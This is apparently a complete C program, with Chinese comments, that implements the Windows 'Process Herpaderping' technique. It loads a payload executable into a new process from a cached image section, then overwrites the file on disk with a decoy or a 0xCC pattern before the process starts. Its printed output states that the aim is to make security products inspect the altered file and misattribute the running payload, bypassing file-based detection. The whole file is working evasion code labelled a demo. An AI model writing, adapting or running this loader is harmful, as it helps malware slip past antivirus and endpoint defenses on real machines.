#include <windows.h>
#include <stdio.h>
#include <userenv.h>
#include "internals.h"
#include "pe_utils.h"

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "userenv.lib")

// ===== 全局函数指针定义 =====
_NtCreateSection NtCreateSection = NULL;
_NtCreateProcessEx NtCreateProcessEx = NULL;
_NtCreateThreadEx NtCreateThreadEx = NULL;
_NtReadVirtualMemory NtReadVirtualMemory = NULL;
_RtlCreateProcessParametersEx RtlCreateProcessParametersEx = NULL;

/**
 * 初始化 NT API 函数指针
 */
BOOL InitializeNtFunctions() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("错误：无法获取 ntdll.dll 句柄\n");
        return FALSE;
    }

    NtCreateSection = (_NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
    NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    NtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    RtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");

    if (!NtCreateSection || !NtCreateProcessEx || !NtCreateThreadEx ||
        !NtReadVirtualMemory || !RtlCreateProcessParametersEx) {
        printf("错误：无法获取 NT API 函数地址\n");
        return FALSE;
    }

    return TRUE;
}

/**
 * 复制文件内容
 */
BOOL CopyFileContent(HANDLE hSource, HANDLE hTarget) {
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hSource, &fileSize)) {
        printf("错误：获取源文件大小失败\n");
        return FALSE;
    }

    DWORD bufferSize = 1024 * 1024; // 1 MB 缓冲区
    BYTE* buffer = (BYTE*)malloc(bufferSize);
    if (!buffer) {
        printf("错误：分配缓冲区失败\n");
        return FALSE;
    }

    SetFilePointer(hSource, 0, NULL, FILE_BEGIN);
    SetFilePointer(hTarget, 0, NULL, FILE_BEGIN);

    LONGLONG remaining = fileSize.QuadPart;
    while (remaining > 0) {
        DWORD toRead = (DWORD)min(remaining, bufferSize);
        DWORD bytesRead, bytesWritten;

        if (!ReadFile(hSource, buffer, toRead, &bytesRead, NULL) || bytesRead == 0) {
            printf("错误：读取源文件失败\n");
            free(buffer);
            return FALSE;
        }

        if (!WriteFile(hTarget, buffer, bytesRead, &bytesWritten, NULL)) {
            printf("错误：写入目标文件失败\n");
            free(buffer);
            return FALSE;
        }

        remaining -= bytesRead;
    }

    free(buffer);
    return TRUE;
}

/**
 * 用模式覆盖文件内容
 */
BOOL OverwriteFileWithPattern(HANDLE hFile, BYTE pattern) {
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) {
        printf("错误：获取文件大小失败\n");
        return FALSE;
    }

    DWORD bufferSize = 1024 * 1024; // 1 MB 缓冲区
    BYTE* buffer = (BYTE*)malloc(bufferSize);
    if (!buffer) {
        printf("错误：分配缓冲区失败\n");
        return FALSE;
    }

    memset(buffer, pattern, bufferSize);
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

    LONGLONG remaining = fileSize.QuadPart;
    while (remaining > 0) {
        DWORD toWrite = (DWORD)min(remaining, bufferSize);
        DWORD bytesWritten;

        if (!WriteFile(hFile, buffer, toWrite, &bytesWritten, NULL)) {
            printf("错误：覆盖文件失败\n");
            free(buffer);
            return FALSE;
        }

        remaining -= bytesWritten;
    }

    free(buffer);
    FlushFileBuffers(hFile);
    return TRUE;
}

/**
 * 设置进程参数
 */
BOOL SetupProcessParameters(HANDLE hProcess, PROCESS_BASIC_INFORMATION* pbi, const WCHAR* targetPath) {
    printf("\n[6] 设置进程参数\n");

    // 1. 初始化 UNICODE_STRING
    UNICODE_STRING uImagePath;
    RtlInitUnicodeString(&uImagePath, targetPath);

    WCHAR dllDir[] = L"C:\\Windows\\System32";
    UNICODE_STRING uDllPath;
    RtlInitUnicodeString(&uDllPath, dllDir);

    WCHAR currentDir[MAX_PATH];
    GetCurrentDirectoryW(MAX_PATH, currentDir);
    UNICODE_STRING uCurrentDir;
    RtlInitUnicodeString(&uCurrentDir, currentDir);

    WCHAR windowName[] = L"Process Herpaderping Demo";
    UNICODE_STRING uWindowName;
    RtlInitUnicodeString(&uWindowName, windowName);

    // 2. 创建环境块
    PVOID environment = NULL;
    CreateEnvironmentBlock(&environment, NULL, TRUE);

    // 3. 创建进程参数
    PMY_RTL_USER_PROCESS_PARAMETERS params = NULL;
    NTSTATUS status = RtlCreateProcessParametersEx(
        &params,
        &uImagePath,
        &uDllPath,
        &uCurrentDir,
        &uImagePath,
        environment,
        &uWindowName,
        NULL,
        NULL,
        NULL,
        RTL_USER_PROC_PARAMS_NORMALIZED
    );

    if (status != STATUS_SUCCESS) {
        printf("错误：RtlCreateProcessParametersEx 失败，状态码：0x%lX\n", status);
        if (environment) DestroyEnvironmentBlock(environment);
        return FALSE;
    }

    // 4. 在远程进程中分配内存并写入参数
    SIZE_T paramsSize = params->Length;

    if (!VirtualAllocEx(hProcess, params, paramsSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
        printf("错误：在远程进程分配参数内存失败\n");
        if (environment) DestroyEnvironmentBlock(environment);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, params, params, paramsSize, NULL)) {
        printf("错误：写入进程参数失败\n");
        if (environment) DestroyEnvironmentBlock(environment);
        return FALSE;
    }

    // 5. 写入环境变量
    if (params->Environment) {
        if (!VirtualAllocEx(hProcess, params->Environment, params->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
            printf("警告：分配环境变量内存失败\n");
        } else {
            WriteProcessMemory(hProcess, params->Environment, params->Environment, params->EnvironmentSize, NULL);
        }
    }

    // 6. 更新 PEB 中的 ProcessParameters 指针
    MY_PEB peb = {0};
    SIZE_T bytesRead = 0;

    status = NtReadVirtualMemory(hProcess, pbi->PebBaseAddress, &peb, sizeof(MY_PEB), &bytesRead);
    if (status != STATUS_SUCCESS) {
        printf("错误：读取远程 PEB 失败\n");
        if (environment) DestroyEnvironmentBlock(environment);
        return FALSE;
    }

    // 计算 ProcessParameters 字段的偏移
    ULONG_PTR offset = (ULONG_PTR)&peb.ProcessParameters - (ULONG_PTR)&peb;
    PVOID remoteParamsAddr = (PVOID)((ULONG_PTR)pbi->PebBaseAddress + offset);

    if (!WriteProcessMemory(hProcess, remoteParamsAddr, &params, sizeof(PVOID), NULL)) {
        printf("错误：更新 PEB ProcessParameters 失败\n");
        if (environment) DestroyEnvironmentBlock(environment);
        return FALSE;
    }

    if (environment) DestroyEnvironmentBlock(environment);

    printf("    进程参数已设置\n");
    return TRUE;
}

/**
 * 主函数：进程 Herpaderping
 */
int wmain(int argc, WCHAR* argv[]) {
    printf("======================================\n");
    printf("    Process Herpaderping 演示程序\n");
    printf("======================================\n");

    if (argc < 3) {
        printf("\n用法：%ls <源文件> <目标文件> [覆盖文件]\n", argv[0]);
        printf("\n示例：\n");
        printf("  %ls payload.exe target.exe\n", argv[0]);
        printf("  %ls payload.exe target.exe fake.exe\n", argv[0]);
        printf("\n说明：\n");
        printf("  源文件：   实际要执行的载荷\n");
        printf("  目标文件： 载荷写入的文件（会被覆盖）\n");
        printf("  覆盖文件： 可选，用于覆盖目标文件的内容\n");
        printf("            （不指定则使用 0xCC 模式覆盖）\n");
        return 1;
    }

    // 初始化函数指针
    if (!InitializeNtFunctions()) {
        return 1;
    }

    const WCHAR* sourceFile = argv[1];
    const WCHAR* targetFile = argv[2];
    const WCHAR* replaceFile = (argc >= 4) ? argv[3] : NULL;

    printf("\n========== 开始 Process Herpaderping ==========\n");
    printf("源文件： %ls\n", sourceFile);
    printf("目标文件：%ls\n", targetFile);
    if (replaceFile) {
        printf("覆盖文件：%ls\n", replaceFile);
    } else {
        printf("覆盖模式：0xCC 模式\n");
    }

    // [1] 打开源文件
    printf("\n[1] 打开源文件\n");
    HANDLE hSource = CreateFileW(sourceFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hSource == INVALID_HANDLE_VALUE) {
        printf("错误：打开源文件失败，错误码：%d\n", GetLastError());
        return 1;
    }
    printf("    源文件已打开\n");

    // [2] 创建目标文件（保持句柄打开）
    printf("\n[2] 创建目标文件\n");
    HANDLE hTarget = CreateFileW(targetFile, GENERIC_READ | GENERIC_WRITE,
                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
                                  NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hTarget == INVALID_HANDLE_VALUE) {
        printf("错误：创建目标文件失败，错误码：%d\n", GetLastError());
        CloseHandle(hSource);
        return 1;
    }
    printf("    目标文件已创建\n");

    // [3] 复制源文件到目标文件
    printf("\n[3] 复制载荷到目标文件\n");
    if (!CopyFileContent(hSource, hTarget)) {
        CloseHandle(hTarget);
        CloseHandle(hSource);
        return 1;
    }
    printf("    载荷已复制\n");

    CloseHandle(hSource);

    // [4] 创建内存节（SEC_IMAGE）
    printf("\n[4] 创建内存节对象（SEC_IMAGE）\n");
    HANDLE hSection = NULL;
    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hTarget
    );

    if (status != STATUS_SUCCESS) {
        printf("错误：NtCreateSection 失败，状态码：0x%lX\n", status);
        CloseHandle(hTarget);
        return 1;
    }
    printf("    节句柄：0x%p\n", hSection);
    printf("    关键：此时镜像节已被缓存！\n");

    // [5] 从内存节创建进程
    printf("\n[5] 从内存节创建进程（NtCreateProcessEx）\n");
    HANDLE hProcess = NULL;
    status = NtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
        hSection,
        NULL,
        NULL,
        FALSE
    );

    if (status != STATUS_SUCCESS) {
        printf("错误：NtCreateProcessEx 失败，状态码：0x%lX\n", status);
        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
            printf("提示：载荷架构不匹配（32/64 位）\n");
        }
        CloseHandle(hSection);
        CloseHandle(hTarget);
        return 1;
    }

    DWORD processId = GetProcessId(hProcess);
    printf("    进程已创建！\n");
    printf("    进程 ID：%d\n", processId);

    CloseHandle(hSection);

    // [6] 覆盖目标文件（关键步骤！）
    printf("\n[6] 覆盖目标文件内容（Herpaderping！）\n");

    if (replaceFile) {
        printf("    使用文件覆盖：%ls\n", replaceFile);
        HANDLE hReplace = CreateFileW(replaceFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hReplace == INVALID_HANDLE_VALUE) {
            printf("错误：打开覆盖文件失败\n");
        } else {
            SetFilePointer(hTarget, 0, NULL, FILE_BEGIN);
            if (!CopyFileContent(hReplace, hTarget)) {
                printf("警告：覆盖文件失败\n");
            } else {
                printf("    已用覆盖文件替换目标文件内容\n");
            }
            CloseHandle(hReplace);
        }
    } else {
        printf("    使用 0xCC 模式覆盖\n");
        if (!OverwriteFileWithPattern(hTarget, 0xCC)) {
            printf("警告：覆盖文件失败\n");
        } else {
            printf("    已用 0xCC 模式覆盖目标文件\n");
        }
    }

    printf("    \n");
    printf("    ★ 关键点：磁盘文件已修改，但缓存的节未变！\n");
    printf("    ★ 安全产品检查磁盘时看到的是修改后的内容！\n");

    // [7] 查询进程信息
    printf("\n[7] 查询进程基本信息\n");
    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG returnLength = 0;

    status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    if (status != STATUS_SUCCESS) {
        printf("错误：NtQueryInformationProcess 失败\n");
        TerminateProcess(hProcess, 1);
        CloseHandle(hTarget);
        CloseHandle(hProcess);
        return 1;
    }

    printf("    PEB 地址：0x%p\n", pbi.PebBaseAddress);

    // 读取 PEB 获取 ImageBase
    MY_PEB peb = {0};
    SIZE_T bytesRead = 0;
    status = NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(MY_PEB), &bytesRead);
    if (status != STATUS_SUCCESS) {
        printf("错误：读取 PEB 失败\n");
        TerminateProcess(hProcess, 1);
        CloseHandle(hTarget);
        CloseHandle(hProcess);
        return 1;
    }

    printf("    镜像基址：0x%p\n", peb.ImageBaseAddress);

    // 设置进程参数
    SetupProcessParameters(hProcess, &pbi, targetFile);

    // [8] 获取入口点
    printf("\n[8] 获取入口点并创建线程\n");

    // 重新打开目标文件读取入口点（因为被覆盖了）
    SetFilePointer(hTarget, 0, NULL, FILE_BEGIN);

    BYTE* originalPayload = ReadFileToBuffer(sourceFile, NULL);
    if (!originalPayload) {
        printf("错误：重新读取源文件失败\n");
        TerminateProcess(hProcess, 1);
        CloseHandle(hTarget);
        CloseHandle(hProcess);
        return 1;
    }

    DWORD entryRVA = GetEntryPointRVA(originalPayload);
    free(originalPayload);

    ULONG_PTR entryPoint = (ULONG_PTR)peb.ImageBaseAddress + entryRVA;

    printf("    入口点 RVA：0x%X\n", entryRVA);
    printf("    入口点 VA：0x%p\n", (PVOID)entryPoint);

    // [9] 创建线程执行
    printf("\n[9] 创建线程（触发进程通知回调）\n");
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE)entryPoint,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (status != STATUS_SUCCESS) {
        printf("错误：NtCreateThreadEx 失败，状态码：0x%lX\n", status);
        TerminateProcess(hProcess, 1);
        CloseHandle(hTarget);
        CloseHandle(hProcess);
        return 1;
    }

    printf("    线程已创建！\n");
    printf("    线程 ID：%d\n", GetThreadId(hThread));
    printf("    \n");
    printf("    ★ 此时内核进程通知回调触发！\n");
    printf("    ★ 安全产品检查到的是覆盖后的文件！\n");

    // [10] 关闭文件句柄
    printf("\n[10] 关闭文件句柄\n");
    CloseHandle(hTarget);
    printf("    文件句柄已关闭\n");
    printf("    ★ IRP_MJ_CLEANUP 触发，检查仍是覆盖后的内容！\n");

    printf("\n========== Process Herpaderping 完成 ==========\n");
    printf("进程 %d 正在执行原始载荷代码\n", processId);
    printf("\n技术特点：\n");
    printf("  • 磁盘文件被覆盖，但进程执行的是原始载荷\n");
    printf("  • 安全产品检查磁盘文件时归因错误\n");
    printf("  • 不依赖事务，比 Doppelgänging 更简单\n");
    printf("  • 绕过基于文件检查的安全产品\n");

    // 清理
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
